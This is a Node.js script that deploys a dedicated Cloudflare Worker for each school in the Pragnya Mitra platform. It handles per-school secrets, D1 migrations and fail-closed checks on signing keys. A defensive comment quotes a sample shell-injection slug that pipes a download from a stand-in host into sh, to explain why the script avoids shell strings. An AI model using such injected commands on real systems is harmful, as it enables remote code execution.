/**
 * Pragnya Mitra — deploy per-school dedicated Cloudflare Workers.
 *
 * Every school runs on its own dedicated worker. For each school this script:
 *   1. writes a per-school secrets file (JSON),
 *   2. applies D1 migrations,
 *   3. copies any existing shared-D1 operational data into the dedicated D1
 *      (scripts/migrate-to-dedicated.mjs — idempotent, fail-loud),
 *   4. deploys the dedicated worker directly via
 *      wrangler deploy --secrets-file <file> -c wrangler-<slug>.toml.
 *
 * Each dedicated worker carries its own [[routes]] entry (generated by
 * scripts/generate-school-configs.mjs), so it deploys and routes like any
 * standard Cloudflare Worker.
 *
 * Required env vars: CLOUDFLARE_API_TOKEN, CLOUDFLARE_ACCOUNT_ID
 * Optional env vars: DEDICATED_SECRETS_JSON, RAZORPAY_KEY_ID/SECRET, AUTH_SECRET,
 *   FCM_SERVICE_ACCOUNT_JSON, WEB_PUSH_VAPID_PRIVATE_KEY, FIREBASE_WEB_CONFIG_JSON
 */
import fs from 'fs';
import { execFileSync } from 'child_process';
import { migrateSchool } from './migrate-to-dedicated.mjs';

const REGISTRY_FILE = 'schools.json';
// The wrangler version is pinned in package.json devDependencies and installed by
// `npm ci`, so `npx wrangler` resolves the local build. It was previously a
// floating `npx --yes wrangler@4`, which meant a new wrangler release silently
// changed how dedicated workers were deployed, with no commit recording it.
const WRANGLER = 'npx wrangler';

// Runs wrangler with an ARGUMENT ARRAY, never a shell command string.
//
// This used to be execSync() over an interpolated string:
//
//     run('npx wrangler deploy -c wrangler-' + slug + '.toml')
//
// `slug` comes from schools.json, which is a data file that a registry write, a
// manual edit or a compromised token can influence. Interpolating it into a shell
// command means a slug like `x; curl evil.sh | sh` executes. generate-school-configs
// does validate the slug shape, but this is the step that WRITES and DEPLOYS, and
// the blast radius of a shell injection here is the whole Cloudflare account, not
// one filename. CodeQL flagged exactly this pattern in the smoke scripts earlier;
// it is the same bug.
//
// The slug is also used to build a filename, so execFileSync also removes the
// chance of a quote breaking the path.
function run(args) {
  console.log('> ' + WRANGLER + ' ' + args.join(' '));
  return execFileSync('npx', ['wrangler', ...args], {
    encoding: 'utf-8',
    stdio: 'inherit',
    env: process.env,
    shell: false,
  });
}

async function main() {
  if (!fs.existsSync(REGISTRY_FILE)) {
    console.error('Registry file ' + REGISTRY_FILE + ' not found.');
    process.exit(1);
  }

  const registry = JSON.parse(fs.readFileSync(REGISTRY_FILE, 'utf-8'));
  const SECRETS_JSON = process.env.DEDICATED_SECRETS_JSON
    ? JSON.parse(process.env.DEDICATED_SECRETS_JSON)
    : {};

  for (const school of registry.schools) {
    if (school.mode !== 'dedicated') continue;

    const slug = school.slug;
    const conf = 'wrangler-' + slug + '.toml';
    if (!fs.existsSync(conf)) {
      console.error('Missing config ' + conf + ' — run "node scripts/generate-school-configs.mjs" first.');
      continue;
    }

    console.log('\n=== Deploying Dedicated Worker: ' + slug + ' ===\n');

    const schoolSecrets = SECRETS_JSON[slug] || {};

    // Every dedicated worker must sign with its OWN key.
    //
    // This used to fall back to the platform's AUTH_SECRET, which meant all schools
    // shared one signing key: a leak was a fleet-wide leak, and a token minted for one
    // school verified on every other. `getAuthUser` already pins SCHOOL_ID so a
    // cross-school token was refused anyway -- this closes the second line of defence
    // that the first one was standing in for.
    //
    // It is now FAIL-CLOSED on purpose. Silently falling back is how the shared key
    // came to be in the first place: one missing entry in DEDICATED_SECRETS_JSON would
    // quietly put every school back on one key, and the only symptom would be tokens
    // that verify in more places than they should. A deploy that stops with a clear
    // message is much cheaper than that.
    const perSchoolAuthSecret = schoolSecrets.AUTH_SECRET;
    if (!perSchoolAuthSecret) {
      console.error(
        '\n  REFUSING TO DEPLOY ' + slug + ': no per-school AUTH_SECRET.\n\n' +
        '  DEDICATED_SECRETS_JSON has no AUTH_SECRET for slug "' + slug + '".\n' +
        '  Falling back to the platform AUTH_SECRET would put this school back on the\n' +
        '  shared signing key, which is the exact condition this check exists to stop.\n\n' +
        '  Add one, then redeploy:\n' +
        '    node scripts/rotate-per-school-auth-secret.mjs\n\n',
      );
      process.exit(1);
    }

    const secrets = {
      RAZORPAY_KEY_ID: schoolSecrets.RAZORPAY_KEY_ID || process.env.RAZORPAY_KEY_ID,
      RAZORPAY_KEY_SECRET: schoolSecrets.RAZORPAY_KEY_SECRET || process.env.RAZORPAY_KEY_SECRET,
      AUTH_SECRET: perSchoolAuthSecret,
      // Fleet-wide on purpose. See the comment added to deploy.yml: deriving this from
      // AUTH_SECRET would give every school a different M2M secret now that the auth
      // keys differ per school, and the billing proxy would fail everywhere.
      INTERNAL_SYNC_SECRET: process.env.INTERNAL_SYNC_SECRET || schoolSecrets.INTERNAL_SYNC_SECRET,
      FCM_SERVICE_ACCOUNT_JSON: process.env.FCM_SERVICE_ACCOUNT_JSON,
      WEB_PUSH_VAPID_PRIVATE_KEY: process.env.WEB_PUSH_VAPID_PRIVATE_KEY,
      FIREBASE_WEB_CONFIG_JSON: process.env.FIREBASE_WEB_CONFIG_JSON,
    };
    for (const key of Object.keys(secrets)) {
      if (!secrets[key]) delete secrets[key];
    }
    if (!secrets.INTERNAL_SYNC_SECRET) {
      console.error(
        '\n  REFUSING TO DEPLOY ' + slug + ': INTERNAL_SYNC_SECRET is not set.\n\n' +
        '  Without it, getInternalSyncSecret derives m2m_<hmac(AUTH_SECRET)>, and since\n' +
        '  each school now has its own AUTH_SECRET the platform could no longer verify\n' +
        '  any school\'s M2M signature. Billing would break on every school at once.\n\n',
      );
      process.exit(1);
    }

    // Apply D1 migrations first so the schema is ready when the worker goes live.
    run(['d1', 'migrations', 'apply', 'DB', '--remote', '-c', conf]);

    // Copy shared-D1 operational rows into the dedicated D1 BEFORE the worker goes
    // live (fail-loud — any copy failure aborts this school's deploy, so the
    // wildcard fallback keeps serving shared mode and nothing breaks).
    // FORCE_SCHOOL_DATA_COPY=true re-copies idempotently (one-off repair when
    // rows are missing from a dedicated D1).
    if (school.schoolId) {
      const forceCopy = process.env.FORCE_SCHOOL_DATA_COPY === 'true';
      await migrateSchool(slug, school.schoolId, { force: forceCopy });
    }

    if (Object.keys(secrets).length > 0) {
      const secretsFile = 'wrangler-' + slug + '.secrets.json';
      // The file holds live Razorpay keys and the shared AUTH_SECRET, written
      // into a workspace that on CI is a public runner. It is removed in the
      // finally block either way; shred is a no-op on most container filesystems
      // but costs nothing where it is not.
      fs.writeFileSync(secretsFile, JSON.stringify(secrets), { mode: 0o600 });
      try {
        run(['deploy', '--secrets-file', secretsFile, '-c', conf]);
      } finally {
        try { execFileSync('shred', ['-u', secretsFile], { stdio: 'ignore' }); }
        catch (_) { /* not available; plain delete still happens */ }
        fs.rmSync(secretsFile, { force: true });
      }
    } else {
      run(['deploy', '-c', conf]);
    }
  }
}

main().catch((err) => {
  console.error(err);
  process.exit(1);
});
